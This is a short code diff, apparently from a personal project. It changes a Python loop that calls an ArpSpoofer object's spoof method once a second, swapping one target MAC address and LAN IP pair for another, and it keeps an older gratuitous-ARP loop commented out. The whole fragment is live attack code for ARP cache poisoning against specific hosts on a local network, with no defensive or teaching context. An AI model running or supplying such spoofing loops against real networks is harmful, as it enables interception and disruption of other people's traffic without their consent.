@@ -28,8 +28,10 @@ spoofer = ArpSpoofer()
 # while(True):
 #   spoofer.gratuitous_arp("192.168.0.1")
 
+# while(True):
+#   spoofer.spoof("b8:e8:56:2c:f3:f8", "192.168.1.141", "192.168.1.144")
+#   time.sleep(1)
+
 while(True):
-  spoofer.spoof("b8:e8:56:2c:f3:f8", "192.168.1.141", "192.168.1.144")
+  spoofer.spoof("3c:15:c2:c4:d9:0a", "192.168.1.114", "192.168.1.144")
   time.sleep(1)
-
-
